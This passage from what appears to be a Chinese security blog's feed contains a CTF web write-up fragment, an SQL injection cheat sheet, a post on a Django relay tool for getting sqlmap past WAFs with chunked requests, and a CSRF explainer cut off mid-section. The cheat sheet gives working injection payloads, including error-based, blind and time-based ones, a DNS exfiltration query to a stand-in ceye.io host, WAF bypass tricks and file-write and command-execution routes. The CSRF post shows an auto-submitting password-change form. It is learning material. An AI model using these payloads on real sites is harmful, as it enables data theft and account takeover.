&#39;c4ca4238a0b923820dcc509a6f75849b&amp;pass=1</code><br>1的md5为：c4ca4238a0b923820dcc509a6f75849b<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/11/5caf6479b0889.png">  </p><h3 id="0x18-what-a-fuck-这是什么鬼东西"><a href="#0x18-what-a-fuck-这是什么鬼东西" class="headerlink" title="0x18 what a fuck!这是什么鬼东西?"></a>0x18 what a fuck!这是什么鬼东西?</h3><h4 id="简单概括：-23"><a href="#简单概括：-23" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：JSFUCK  </li><li>难度：易  </li><li>WP：<code>复制代码到浏览器控制台执行即可</code>  </li></ul><h4 id="解题过程：-20"><a href="#解题过程：-20" class="headerlink" title="解题过程："></a>解题过程：</h4><p>复制粘贴进浏览器的js控制台，回车运行即可。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/12/5caf64ffb33cb.png">  </p><h3 id="0x19-PHP大法"><a href="#0x19-PHP大法" class="headerlink" title="0x19 PHP大法"></a>0x19 PHP大法</h3><h4 id="简单概括：-24"><a href="#简单概括：-24" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：PHP自动解码机制  </li><li>难度：易  </li><li>WP：<code>id=%2568ackerDJ</code></li></ul><h4 id="解题过程：-21"><a href="#解题过程：-21" class="headerlink" title="解题过程："></a>解题过程：</h4><p>打开题目，页面提示：index.php.txt，打开得到源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123;</span><br><span class="line">  echo(&quot;&lt;p&gt;not allowed!&lt;&#x2F;p&gt;&quot;);</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_GET[id] &#x3D; urldecode($_GET[id]);</span><br><span class="line">if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  echo &quot;&lt;p&gt;Access granted!&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;p&gt;flag: *****************&#125; &lt;&#x2F;p&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;</span><br><span class="line">Can you authenticate to this website?</span><br></pre></td></tr></table></figure></p><p><code>$_GET[id]</code>在取到值后已经自动urldecode了一次，然而后边再用urldecode解码一次，故可以使用二次编码绕过前边的关键字检测。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/12/5caf66674a8d7.png">  </p><h3 id="0x1A-这个看起来有点简单"><a href="#0x1A-这个看起来有点简单" class="headerlink" title="0x1A 这个看起来有点简单!"></a>0x1A 这个看起来有点简单!</h3><h4 id="简单概括：-25"><a href="#简单概括：-25" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Union无过滤注入  </li><li>难度：易  </li><li>WP：无</li></ul><h3 id="0x1B-貌似有点难"><a href="#0x1B-貌似有点难" class="headerlink" title="0x1B 貌似有点难"></a>0x1B 貌似有点难</h3><h4 id="简单概括：-26"><a href="#简单概括：-26" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：Header头IP伪造  </li><li>难度：易  </li><li>WP：无</li></ul><h3 id="0x1C-头有点大"><a href="#0x1C-头有点大" class="headerlink" title="0x1C 头有点大"></a>0x1C 头有点大</h3><h4 id="简单概括：-27"><a href="#简单概括：-27" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：UA头伪造  </li><li>难度：易  </li><li>WP：无  </li></ul><h3 id="0x1D-猫抓老鼠"><a href="#0x1D-猫抓老鼠" class="headerlink" title="0x1D 猫抓老鼠"></a>0x1D 猫抓老鼠</h3><h4 id="简单概括：-28"><a href="#简单概括：-28" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：脑洞  </li><li>难度：及其变态神经病的题目  </li><li>WP：无</li></ul><h4 id="解题过程：-22"><a href="#解题过程：-22" class="headerlink" title="解题过程："></a>解题过程：</h4><p>查看访问请求返回头，发现有东西：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/04/12/5caf67566e8f0.png"><br>将这串base64放到表单里提交即可。</p><h3 id="0x1E-看起来有点难"><a href="#0x1E-看起来有点难" class="headerlink" title="0x1E 看起来有点难"></a>0x1E 看起来有点难</h3><h4 id="简单概括：-29"><a href="#简单概括：-29" class="headerlink" title="简单概括："></a>简单概括：</h4><ul><li>考点：时间盲注  </li><li>难度：中  </li><li>WP：sqlmap一把嗦</li></ul>]]></content>
    
    <summary type="html">
    
      个人刷题记录
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="CTF" scheme="https://www.0x002.com/tags/CTF/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入备忘录</title>
    <link href="https://www.0x002.com/2019/SQL%E6%B3%A8%E5%85%A5%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    <id>https://www.0x002.com/2019/SQL注入备忘录/</id>
    <published>2019-04-04T17:01:00.000Z</published>
    <updated>2019-06-17T16:13:47.651Z</updated>
    
    <content type="html"><![CDATA[<h1 id="备忘录-一"><a href="#备忘录-一" class="headerlink" title="备忘录(一)"></a>备忘录(一)</h1><p>拿起小本本记下常考知识点。<br><a id="more"></a></p><h2 id="常用连接词"><a href="#常用连接词" class="headerlink" title="常用连接词"></a>常用连接词</h2><ul><li>and &amp;&amp; %23%23 且</li><li>or || %7c%7c 或</li><li>xor 非</li></ul><h2 id="Access-数据库："><a href="#Access-数据库：" class="headerlink" title="Access 数据库："></a>Access 数据库：</h2><p><strong>只能爆破表名、列名获取数据、无法用盲注等<br>数据主要存储在mdb、sap文件内</strong></p><h3 id="0x01-手工："><a href="#0x01-手工：" class="headerlink" title="0x01 手工："></a>0x01 手工：</h3><p>先判断字段数：<br><code>order by xx</code><br>在使用联合查询猜测表名列名：  </p><blockquote><p>前后两个子查询返回的结构必须相同，且数据类型必须相同，故常用NULL</p></blockquote><p>猜表：<code>union select 1,2,3,xx</code><br>猜列：<code>union select 1,2,password,4,5</code> (如果页面返回正常，则存在password列，猜表同理)<br>此方法<strong>兼容性</strong>不强。</p><h3 id="0x02-工具："><a href="#0x02-工具：" class="headerlink" title="0x02 工具："></a>0x02 工具：</h3><p>逐字猜解法：<br>一、<strong>查表：</strong><br><code>and exists (select * from 表名)</code>//这里的表名需要靠猜解，如果表名存在返回正常页面。<br>二、<strong>查列：</strong><br>将<code>*</code>换成列名可进行爆破列名，即：<code>and exists (select 列名 from 表名)</code><br>三、<strong>确定列名下的数据长度：</strong><br><code>and (select top 1 len(列名) from 表名)=5</code> //判断数据长度是否为5，若为5则返回正常<br>四、<strong>逐字猜解数据：</strong><br><code>and (select top 1 asc(mid(列名,位数,1)) from 表名)=97</code> //用mid函数取第x位字母，通过asc函数转化成ascii码进行判断比较，如果ascii为97，即字母a，页面返回正常</p><h2 id="mysql数据库："><a href="#mysql数据库：" class="headerlink" title="mysql数据库："></a>mysql数据库：</h2><h3 id="Version-lt-5-0"><a href="#Version-lt-5-0" class="headerlink" title="Version&lt;5.0:"></a>Version&lt;5.0:</h3><ul><li>爆破</li><li>盲注</li></ul><h3 id="version-gt-5-0"><a href="#version-gt-5-0" class="headerlink" title="version&gt;=5.0:"></a>version&gt;=5.0:</h3><p><strong>information_schema</strong>表下存储了Mysql数据库所有的数据库结果信息。  </p><ul><li>information_schema.schemeta //Mysql里所有的数据库库名</li><li>information_schema.tables //所有表名</li><li>information_schema.columns //所有列名</li></ul><p><strong>常用函数：</strong></p><ul><li>user() //查询数据库用户</li><li>version()  //查询版本</li><li>@@basedir()  //查询数据库路径</li><li>database() //查询当前数据库名</li><li>@@version_compile_os() //查询操作系统</li></ul><p><strong>用法例子：</strong><br><code>union select user(),2,3,version(),database(),xxx</code><br><em>可用null代替：</em><br><code>union select user(),null,null,version(),database(),xxx</code>  </p><p><strong>更多函数：</strong></p><ul><li>concat() //字符串相加</li><li>group_concat() //分组打印</li><li>length() //取字符串长度</li><li>substr(str,pos,len) //str字符串从pos位置开始取len个长度 substring()别名</li><li>mid(str,pos,len)  //str字符串从pos位置开始取len个长度</li><li>ascii(str)  //返回字符串str的首个字符的ASCII代码值</li><li>ord(str) //str或bool转为ascii</li><li>if(a,b,c) //a为条件，若a正确则返回b，相反返回c.</li></ul><p><strong>常用查询：</strong><br>查询全部数据库名：<br><code>select schema_name from information_schema.schemeta limit 0,10</code> //取前十个<br>查询指定表名：<br><code>select table_name from information_schema.tables where table_schema=&#39;sqli&#39;</code> //若单引号被过滤可用十六进制<br>查询指定列名：<br><code>select column_name from information_schema.columns where table_name=&#39;user&#39; and table_schema=&#39;sqli&#39;</code><br>获取指定数据:<br><code>select username,password from sqli.user</code> (垮库查询)  </p><h3 id="注释："><a href="#注释：" class="headerlink" title="注释："></a>注释：</h3><blockquote><p>#，<br>– X(X为任意字符)<br>/<em>(MySQL-5.1)<br>;%00<br><code>&#39;or 1=1;%00  &#39;or 1=1 union select 1,2</code>‘<br>‘or 1=1 #<br>‘/</em>!50000or<em>/ 1=1 – -      //版本号为5.1.38时只要小于50138<br>‘/</em>!or*/ 1=1 – -  </p></blockquote><p><strong>nd/or后面可以跟上偶数个!、~可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略</strong></p><h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>一、常见：<br><strong>mysql数据库编码为gbk,且若’被转义成\’<br>使用<code>id=%df%27</code>，这里的<code>%27</code>会被变成<code>\%27</code>即<code>%5c%27</code>，再加上前边的<code>%df</code>变成<code>%df%5c%27</code>，而<code>%df%5c</code>在gbk字符集中表示汉子： 運，故语句便成<code>id=運&#39;</code>，成功逃逸出单引号转义(php中通常是addslashes函数，或开启GPC，PHP5.4版本已移除GPC)</strong><br>二、php函数utf8转gbk产生：<br><a href="https://xz.aliyun.com/t/1719" target="_blank" rel="noopener">https://xz.aliyun.com/t/1719</a></p><h2 id="报错注入："><a href="#报错注入：" class="headerlink" title="报错注入："></a>报错注入：</h2><h3 id="floor-和rand"><a href="#floor-和rand" class="headerlink" title="floor()和rand()"></a>floor()和rand()</h3><p><strong>虚拟表报错原理：</strong><br>payload:<br><code>union select count(*),2,concat(&#39;:&#39;,(select database()),&#39;:&#39;,floor(rand()*2))as a from information_schema.tables group by a</code><br><a href="https://www.2cto.com/article/201604/498394.html" target="_blank" rel="noopener">https://www.2cto.com/article/201604/498394.html</a></p><h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><p><strong>原理：</strong><br>extractvalue函数的第二个参数格式错误，会返回参数内容<br>payload:<br><code>and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</code></p><h3 id="updatexml-同上具有32位长度限制"><a href="#updatexml-同上具有32位长度限制" class="headerlink" title="updatexml() 同上具有32位长度限制"></a>updatexml() 同上具有32位长度限制</h3><p>原理同上<br>payload:<br><code>and (updatexml(1,concat(0x7e,(select user()),0x7e),1))</code><br>// concat 在前后加上 ~ 使数据不符合参数格式从而报错</p><h3 id="GeometryCollection-等三重子查询报错"><a href="#GeometryCollection-等三重子查询报错" class="headerlink" title="GeometryCollection()等三重子查询报错"></a>GeometryCollection()等三重子查询报错</h3><blockquote><p>id = 1 AND GeometryCollection((select <em> from (select </em> from(select user())a)b))<br>polygon()<br>id =1 AND polygon((select <em> from(select </em> from(select user())a)b))<br>multipoint()<br>id = 1 AND multipoint((select <em> from(select </em> from(select user())a)b))<br>multilinestring()<br>id = 1 AND multilinestring((select <em> from(select </em> from(select user())a)b))<br>linestring()<br>id = 1 AND LINESTRING((select <em> from(select </em> from(select user())a)b))<br>multipolygon()<br>id =1 AND multipolygon((select <em> from(select </em> from(select user())a)b))</p></blockquote><h3 id="exp-Mysql5-5-5"><a href="#exp-Mysql5-5-5" class="headerlink" title="exp() Mysql5.5.5+"></a>exp() Mysql5.5.5+</h3><p><strong>原理：</strong><br>exp函数参数过大，转换时溢出报错<br>payload:<br><code>and exp(~(select * from(select user())a))</code><br><a href="https://drops.secquan.org/tips/8166" target="_blank" rel="noopener">https://drops.secquan.org/tips/8166</a></p><h3 id="以上类型均为子查询注入"><a href="#以上类型均为子查询注入" class="headerlink" title="以上类型均为子查询注入"></a>以上类型均为子查询注入</h3><h2 id="Mysql盲注："><a href="#Mysql盲注：" class="headerlink" title="Mysql盲注："></a>Mysql盲注：</h2><h3 id="类型"><a href="#类型" class="headerlink" title="类型"></a>类型</h3><ul><li>布尔盲注</li><li>时间盲注</li></ul><p>布尔盲注：<br><code>and ascii(substr(select user(),1,1))&gt;64</code> 如果user()第一位字母Ascii大于64则页面返回正常<br>时间盲注：<br><code>and if(ascii(substr(select user(),1,1))&gt;64,sleep(2),1)</code> 如果user()第一位字母Ascii大于64则页面延迟两秒返回  </p><h3 id="BENCHMARK-count-expr"><a href="#BENCHMARK-count-expr" class="headerlink" title="BENCHMARK(count,expr)"></a>BENCHMARK(count,expr)</h3><p>此函数会执行expr函数count此，会造成明显时间延迟，可构造进行时间盲注</p><p>常见注入：</p><ul><li>数字型</li><li>字符串型<br>按照注入类型：<br>+SELECT型  //常用于获取信息，注入处常位于where 后，后可接注释字符保证查询的语法正确。<br>+INSERT型  //建立新的数据<br>+UPDATA型  //修改数据<br>+DELECT型  //删除数据</li></ul><p>MYSQL长度限制绕过<br>MYSQL对于用户输入的超长字符只会warning 而不是error<br>真实案例： WP注册admin(55个空格)x用户 修改管理员密码</p><h2 id="DNSlog注入"><a href="#DNSlog注入" class="headerlink" title="DNSlog注入"></a>DNSlog注入</h2><p><code>select load_file(concat(&#39;\\\\&#39;,(select database()),&#39;.xxxx.ceye.io\&#39;);</code><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">https://www.cnblogs.com/afanti/p/8047530.html</a><br><a href="https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html" target="_blank" rel="noopener">https://wooyun.js.org/drops/%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E4%BD%BF%E7%94%A8DNS%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE.html</a>  </p><h2 id="SQL注入防御："><a href="#SQL注入防御：" class="headerlink" title="SQL注入防御："></a>SQL注入防御：</h2><p>1.预编译sql<br>2.限制输入数据类型<br>3.过滤编码<br>4.白名单<br>5.管理数据库用户权限<br>6.按时维护，打好补丁</p><h2 id="SQL注入绕过："><a href="#SQL注入绕过：" class="headerlink" title="SQL注入绕过："></a>SQL注入绕过：</h2><p><strong>注入中常注意的编码：</strong></p><ul><li>%01-%0D特殊字符绕空格</li><li>&amp;= 在浏览器Url时要进行URL编码 %26 %3d</li><li>查询字符串中不允许有空格，可用%20,+对其编码</li><li>Cookie注入时，SQL语句中的分号得编码</li></ul><h3 id="单引号过滤"><a href="#单引号过滤" class="headerlink" title="单引号过滤"></a>单引号过滤</h3><p>若有单引号保护，且无编码二次注入即无漏洞。<br>若无单引号保护：<br>字符串可用十六进制表示：<code>0x123456</code>，也可用concat(char(65)+char(75)+xxx)</p><p>注：中间层会将这些编码转换成未编码值  </p><h3 id="逗号过滤"><a href="#逗号过滤" class="headerlink" title="逗号过滤"></a>逗号过滤</h3><p>if()可改写为 case when () then () else () end<br>substr()、mid()等可改写成substr((select user())from(1)for(1))  </p><h3 id="等号过滤"><a href="#等号过滤" class="headerlink" title="等号过滤"></a>等号过滤</h3><p>可用regexp、like、rlike、in等代替  </p><h3 id="判断注入点时的绕过："><a href="#判断注入点时的绕过：" class="headerlink" title="判断注入点时的绕过："></a>判断注入点时的绕过：</h3><ul><li>&amp;&amp; 1=1</li><li>&amp;&amp; 1=true</li><li>&amp;&amp; false</li><li>%23%23 true</li><li>%23%23 ‘0’=0</li><li>%23%23 ‘a’=’b’=’c’ //true</li><li>and~!!~if(‘a’=’b’=”c”,sleep(2),1)</li><li>a’&lt;2 返回正常 &lt;0 返回空值</li></ul><p>特定字符串被过滤时可用考虑全角字符</p><h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><blockquote><p>a) 大小写混合<br>b)替换关键字<br>c)使用编码<br>d)使用注释<br>e)等价函数与命令<br>f)使用特殊符号<br>g)HTTP参数控制<br>h)缓冲区溢出<br>i)整合绕过  </p></blockquote><h2 id="与系统直接交互："><a href="#与系统直接交互：" class="headerlink" title="与系统直接交互："></a>与系统直接交互：</h2><blockquote><p>load_file()读取文件<br>into out_file() 写文件<br>条件：FILE权限，管理员权限默认具有<br>INTO OUTFILE 与 INTO DOMPFILE的区别<br>后者适用于二进制文件，会将目标文件写入同一行内；前者适用于文本文件。<br>MYSQL UDF命令执行：<code>sqlmap: --os-cmd id -v 1</code><br>MSSQL：xp_cmdshell</p></blockquote><h2 id="其他："><a href="#其他：" class="headerlink" title="其他："></a>其他：</h2><h3 id="Boolean注入"><a href="#Boolean注入" class="headerlink" title="Boolean注入"></a>Boolean注入</h3><p>如果页面只返回Yes或No，则原sql查询返回的值可能是可bool值，如果过滤不严，可产生boolean注入，如：<br><code>and length(database())&gt;10</code> 如果次条件为真切前条件返回真，则页面返回正常。  </p><h3 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入"></a>Cookie注入</h3><p>注入存在于Cookie中</p><h3 id="XFF头注入"><a href="#XFF头注入" class="headerlink" title="XFF头注入"></a>XFF头注入</h3><p>注入存在于Header有中的X-Forward-For中，此函数常用于获取客户端真实IP。</p><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>PHP+Mysql不支持<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://wooyun.js.org/images_result/images/2015081902360042624.jpg"></p><h3 id="连接符差异："><a href="#连接符差异：" class="headerlink" title="连接符差异："></a>连接符差异：</h3><p>Oracle: || 是连接符<br>MSSQL: +<br>MYSQL: [空格]  </p><h2 id="相关好文："><a href="#相关好文：" class="headerlink" title="相关好文："></a>相关好文：</h2><p><a href="https://p0sec.net/index.php/archives/117/" target="_blank" rel="noopener">SQL注入备忘手册(更新2017-12-11)</a><br><a href="https://www.cnblogs.com/afanti/p/8047530.html" target="_blank" rel="noopener">巧用DNSlog实现无回显注入</a><br><a href="https://wooyun.js.org/drops/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7.html" target="_blank" rel="noopener">MySQL注入技巧</a><br><a href="https://wooyun.js.org/drops/Mysql%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90%28count%28%29%E3%80%81rand%28%29%E3%80%81group%20by%29.html" target="_blank" rel="noopener">Mysql报错注入原理分析(count()、rand()、group%20by)</a><br><a href="https://wooyun.js.org/drops/%E6%B7%B1%E5%85%A5%E4%BA%86%E8%A7%A3SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87waf%E5%92%8C%E8%BF%87%E6%BB%A4%E6%9C%BA%E5%88%B6.html" target="_blank" rel="noopener">深入了解SQL注入绕过waf和过滤机制</a></p>]]></content>
    
    <summary type="html">
    
      SQL注入学习备忘录
    
    </summary>
    
      <category term="原创栏目" scheme="https://www.0x002.com/categories/%E5%8E%9F%E5%88%9B%E6%A0%8F%E7%9B%AE/"/>
    
    
      <category term="SQL注入" scheme="https://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="备忘录" scheme="https://www.0x002.com/tags/%E5%A4%87%E5%BF%98%E5%BD%95/"/>
    
      <category term="学习笔记" scheme="https://www.0x002.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>SQL注入使用Django中继数据包bypassWAF</title>
    <link href="https://www.0x002.com/2019/SQL%E6%B3%A8%E5%85%A5%E4%BD%BF%E7%94%A8Django%E4%B8%AD%E7%BB%A7%E6%95%B0%E6%8D%AE%E5%8C%85bypassWAF/"/>
    <id>https://www.0x002.com/2019/SQL注入使用Django中继数据包bypassWAF/</id>
    <published>2019-03-30T08:00:00.000Z</published>
    <updated>2019-06-17T16:12:18.683Z</updated>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>本人基于文章<strong>bypassword</strong>的文章<a href="https://www.freebuf.com/news/193659.html" target="_blank" rel="noopener">在HTTP协议层面绕过WAF</a>所编写一款工具。<br><a id="more"></a></p><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><ul><li>Python3.7.0</li><li>Django 2.1</li><li>Requests</li></ul><h1 id="使用范围"><a href="#使用范围" class="headerlink" title="使用范围"></a>使用范围</h1><ul><li>POST注入</li><li>可以分块传输的漏洞网站</li></ul><h1 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h1><p>修改图中圈中的部分，Evil_Url为存在注入的地址，Domain为其域名部分。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/30/5c9f3596b6415.png"></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>靶机环境:<br>PHP5.4+Apache2.2+Mysql5+WAF:<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/30/5c9f386c72c55.png"><br>首先部署Django：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/30/5c9f366a3f773.png"><br>其次将注入点换成部署的Url：<br>如：<code>http://192.168.32.144/2.php</code>存在POST注入，注入参数为<code>id</code>，部署的Url为<code>http://127.0.0.1:8000/</code><br>Sqlmap命令为<code>python sqlmap.py -u &quot;http://127.0.0.1:8000/&quot; --data &quot;id=1&quot;</code><br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/30/5c9f38de211e7.png">  </p><p>支持<code>-r xx.txt</code>需要修改请求头中的Host地址为Django部署的地址<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/31/5c9fa0add9992.gif"></p><h1 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h1><p><a href="https://github.com/HackerYunen/Django-chunked-sqli" target="_blank" rel="noopener">https://github.com/HackerYunen/Django-chunked-sqli</a><br><strong>此项目我不断更新完善，欢迎Star、Issue</strong></p><h1 id="TODO"><a href="#TODO" class="headerlink" title="TODO"></a>TODO</h1><ul><li>暂无</li></ul><h1 id="解疑"><a href="#解疑" class="headerlink" title="解疑"></a>解疑</h1><h2 id="为什么使用Django？"><a href="#为什么使用Django？" class="headerlink" title="为什么使用Django？"></a>为什么使用Django？</h2><p>因为我只会Django</p><h2 id="为什么要中继？"><a href="#为什么要中继？" class="headerlink" title="为什么要中继？"></a>为什么要中继？</h2><p>因为sqlmap等软件无法发送chunked数据包(使用tamper也不行)</p>]]></content>
    
    <summary type="html">
    
      利用分块传输绕WAF的原理编写的简单小工具
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.0x002.com/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="Django" scheme="https://www.0x002.com/tags/Django/"/>
    
      <category term="SQL注入" scheme="https://www.0x002.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="Bypass" scheme="https://www.0x002.com/tags/Bypass/"/>
    
      <category term="WAF" scheme="https://www.0x002.com/tags/WAF/"/>
    
  </entry>
  
  <entry>
    <title>关于CSRF的那点事儿</title>
    <link href="https://www.0x002.com/2019/%E5%85%B3%E4%BA%8ECSRF%E7%9A%84%E9%82%A3%E7%82%B9%E4%BA%8B%E5%84%BF/"/>
    <id>https://www.0x002.com/2019/关于CSRF的那点事儿/</id>
    <published>2019-03-24T08:30:00.000Z</published>
    <updated>2019-06-17T15:56:17.237Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-CSRF简介"><a href="#0x01-CSRF简介" class="headerlink" title="0x01 CSRF简介"></a>0x01 CSRF简介</h2><p>&#160;&#160;&#160;&#160;CSRF，也称XSRF，即跨站请求伪造攻击，与XSS相似，但与XSS相比更难防范，是一种广泛存在于网站中的安全漏洞，经常与XSS一起配合攻击。<br><a id="more"></a></p><h2 id="0x02-CSRF原理"><a href="#0x02-CSRF原理" class="headerlink" title="0x02 CSRF原理"></a>0x02 CSRF原理</h2><p>&#160;&#160;&#160;&#160;攻击者通过盗用用户身份悄悄发送一个请求，或执行某些恶意操作。<br>&#160;&#160;&#160;&#160;CSRF漏洞产生的主要原因：</p><ul><li>请求所有的参数均可确定</li><li>请求的审核不严格，如：只验证了Cookie</li></ul><p>关于CSRF的执行过程，这里引用自<strong>hyddd</strong>大佬画的图：<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/24/5c97436f3c14c.jpg"><br>&#160;&#160;&#160;&#160;我们知道，当我们使用img等标签时，通过设置标签的src等属性引入外部资源，是可以被浏览器认为是合法的跨域请求，也就是说是可以带上Cookie访问的。<br>&#160;&#160;&#160;&#160;试想一下，如果我们在a.com上放置一个img标签<code>&lt;img src=//b.com/del?id=1&gt;</code>。当b.com的用户在cookie没过期的情况下访问a.com，此时浏览器会向b.com发送一个指向<code>http://b.com/del?id=1</code>的<code>GET</code>请求，并且这个请求是带上Cookie的，而b.com的服务器仅仅是通过cookie进行权限判断，那么服务器就会进行相应的操作，比如假设此处为删除某个文章，用户在不知情的情况下便已完成操作。</p><h2 id="0x03-CSRF能够造成的危害"><a href="#0x03-CSRF能够造成的危害" class="headerlink" title="0x03 CSRF能够造成的危害"></a>0x03 CSRF能够造成的危害</h2><ul><li>篡改目标网站上的用户数据； </li><li>盗取用户隐私数据； </li><li>作为其他攻击向量的辅助攻击手法； </li><li>传播CSRF蠕虫。</li></ul><h2 id="0x04-CSRF的利用方式"><a href="#0x04-CSRF的利用方式" class="headerlink" title="0x04 CSRF的利用方式"></a>0x04 CSRF的利用方式</h2><ul><li>通过HTML标签发送合法的跨域请求</li><li>通过Ajax发送请求（由于CORS机制的存在，一般不使用）</li></ul><p>这里涉及到同源策略，如果不是很清楚可以先去了解一下。</p><h3 id="1-HTML标签"><a href="#1-HTML标签" class="headerlink" title="1) HTML标签"></a>1) HTML标签</h3><p>&#160;&#160;&#160;&#160;我们知道，根据同源策略的规定，跨域请求是不允许带上Cookie等信息的，可是出于种种考虑最终没有进行完全禁止，即存在某些合法的跨域请求。<br>&#160;&#160;&#160;&#160;通常由HTML标签<code>src</code>、<code>lowsrc</code>等属性产生的跨域请求是被浏览器认为是合法的跨域请求，并且此时并不需要<strong>javascript</strong>的参与。<br><img src="/img/loading.gif" alt="" class="lazyload" data-src="https://i.loli.net/2019/03/25/5c98de42ab890.png"><br>&#160;&#160;&#160;&#160;由HTML标签发出的合法跨域请求与正常的用户点击发出的请求相比所不同的是：两者请求头中的<strong>Referer</strong>值不同。<br>&#160;&#160;&#160;&#160;不过值得说明的是IE浏览器在面对这种情况时会判断<strong>本地Cookie</strong>是否带上<strong>P3P</strong>属性，如果仅仅是内存Cookie则不受此影响。<br>&#160;&#160;&#160;&#160;CSRF不仅仅只能针对GET请求，也可以针对POST请求，不过只能使用from标签进行自动提交，注意此处需用到<strong>javascript</strong>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form action&#x3D;&quot;http:&#x2F;&#x2F;a.com&#x2F;changepass&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;username&quot; value&#x3D;&quot;victim&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;&quot;hidden&quot; name&#x3D;&quot;password&quot; value&#x3D;&quot;hacker&quot;&gt;</span><br><span class="line">&lt;input id&#x3D;&quot;sub&quot; type&#x3D;&quot;submit&quot;&gt; &#x2F;&#x2F;可用样式表将按钮隐藏</span><br><span class="line">&lt;&#x2F;form&gt; </span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.getElementById(&quot;sub&quot;).click()</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure></p><h3 id="2-Ajax"><a href="#2-Ajax" class="headerlink" title="2) Ajax"></a>2) 